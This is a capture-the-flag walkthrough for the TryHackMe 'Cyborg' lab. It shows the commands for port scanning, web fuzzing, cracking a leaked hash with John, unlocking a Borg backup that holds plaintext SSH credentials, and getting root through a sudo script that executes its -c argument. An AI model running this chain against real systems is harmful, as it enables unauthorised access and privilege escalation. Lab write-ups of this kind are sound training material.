# Cyborg
![tryhackme_logo](https://user-images.githubusercontent.com/83867734/185771149-cb02c6f2-8476-4ab3-a626-cca8db0a08bf.png)

Difficulty: **Easy**

Compromise the machine and read the user.txt and root.txt.

Tags
--
* Fuzzing
* Brute Forcing 
* Hash Cracking 
* Borg Backup
* Linux Enumeration
* Sudoers file

Tools used
--
* nmap
* ffuf
* john

Machines
--
Attacker:
* Name: attacker_machine
* Operating System: Athena OS
* IP Address: 10.18.98.39

Victim:
* Name: victim_machine
* IP Address: 10.10.157.186
* Other information must be gathered during the attack

Phase 1: Enumeration
--
Let's use Nmap with `-g 53` argument for finding the port 80 as opened:
```
sudo nmap -sS -sC -sV 10.10.157.186 -p- -g 53 -vvv

<SNIP>
Initiating SYN Stealth Scan at 23:11
Scanning 10.10.157.186 [65535 ports]
Discovered open port 80/tcp on 10.10.157.186
Discovered open port 22/tcp on 10.10.157.186
<SNIP>
```
Let's visit the HTTP service by the browser and we get the Apache default page. Let's fuzz this website:
```
ffuf -u http://10.10.157.186/FFUF -H 'Host: 10.10.157.186' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko
/20100101 Firefox/91.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=
0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' -H 'DNT: 1' -H 'Sec-GPC: 1' -w /usr/share
/payloads/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FFUF

admin                   [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 76ms]
etc                     [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 60ms]
```
`etc` has two files: `passwd` and `squid.conf`. The first one contains:
```
music_archive:$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.
```
It seems to be cracked by John. The second one contains:
```
auth_param basic program /usr/lib64/squid/basic_ncsa_auth /etc/squid/passwd
auth_param basic children 5
auth_param basic realm Squid Basic Authentication
auth_param basic credentialsttl 2 hours
acl auth_users proxy_auth REQUIRED
http_access allow auth_users
```
Let's crack the hash above by John. Save this hash in the `music.hash` file and run:
```
john music.hash --wordlist=./rockyou.txt

<SNIP>
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
squidward        (music_archive)
<SNIP>
```
Let's keep `squidward` as possible password.

Phase 2: Foothold
--
By visiting the website, we can see also the `http://10.10.157.186/admin/admin.html` page showing the following message:
```
<SNIP>
I heard these proxy things are supposed to make your website secure but i barely know how to use it so im probably making it more insecure in the process.
Might pass it over to the IT guys but in the meantime all the config files are laying about.
And since i dont know how it works im not sure how to delete them hope they don't contain any confidential information lol.
other than that im pretty sure my backup "music_archive" is safe just to confirm.
<SNIP>
```
It could be also related to the files we found in `etc` web directory.

Let's download the `archive.tar` from the Download button inside the web page, and untar it. We get some files inside `home/field/dev/final_archive` directory. By reading `README`, we notice it is a Borg Backup repository.

Let's take some information about Borg: https://medium.com/swlh/backing-up-with-borg-c6f13d74dd6

Borg is a backup software allowing to encrypt files we backup. What we can try to do and recover the backup:
```
cd home/field/dev/final_archive

borg list ./
Enter passphrase for key /home/athena/Downloads/archive/home/field/dev/final_archive: <squidward>
music_archive                        Tue, 2020-12-29 15:00:38 [f789ddb6b0ec108d130d16adebf5713c29faf19c44cad5e1eeb8ba37277b1c82]

borg extract ./::music_archive
```
At this point we get a `home` directory. Let's search some useful information. We can get a note in `home/alex/Documents/note.txt` with the following content:
```
Wow I'm awful at remembering Passwords so I've taken my Friends advice and noting them down!

alex:S3cretP@s3
```
Let's login by SSH with these credentials:
```
ssh 10.10.157.186 -l alex
```
After login, we can get immediately the user flag in `user.txt` file.

Phase 3: Privilege Escalation
--
Let's upload LinPEAS on this target server by SCP protocol from the attacker machine:
```
scp linpeas.sh alex@10.10.157.186:/home/alex/
```
Come back to the victim machine session and run LinPEAS script. While LinPEAS runs, we can open another SSH session and try to search of something useful. If we execute `sudo -l`, we get:
```bash
sudo -l

Matching Defaults entries for alex on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alex may run the following commands on ubuntu:
    (ALL : ALL) NOPASSWD: /etc/mp3backups/backup.sh
```
From the result we understand we can run `/etc/mp3backups/backup.sh` as `sudo` with `alex` user account. We need only to understand the content of `backup.sh`. Inside it, the interesting part is:
```bash
<SNIP>
while getopts c: flag
do
        case "${flag}" in 
                c) command=${OPTARG};;
        esac
done
<SNIP>
cmd=$($command)
echo $cmd
```
So we can execute:
```
sudo /etc/mp3backups/backup.sh -c 'cat /root/root.txt'
```
let's wait some minute and we get our root flag.